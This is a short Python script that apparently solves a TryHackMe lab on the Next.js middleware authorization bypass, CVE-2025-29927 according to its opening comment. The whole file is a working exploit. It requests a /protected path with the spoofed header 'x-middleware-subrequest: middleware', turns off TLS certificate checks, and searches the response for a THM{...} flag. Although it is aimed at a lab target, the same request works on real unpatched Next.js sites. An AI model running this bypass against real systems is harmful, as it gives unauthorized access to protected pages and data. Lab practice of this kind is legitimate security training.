#https://tryhackme.com/room/nextjscve202529927
import sys
import requests
import re


def read_flag(url):

    path="/protected"
    headers = {
    "x-middleware-subrequest": "middleware"
}
    response = requests.get(url + path,headers=headers, verify=False)
    match = re.search(r"THM\{.*?\}", response.text)
    if match:
        print("Found:", match.group())
    else:
        print("flag not found.")

def main():

    if len(sys.argv) != 2:

        print("You must enter an input !!!")
        print("Example: %s http://10.10.10.10:8000/ "% sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("Program is runing....")
    read_flag(url)

if __name__ == "__main__":
    main()
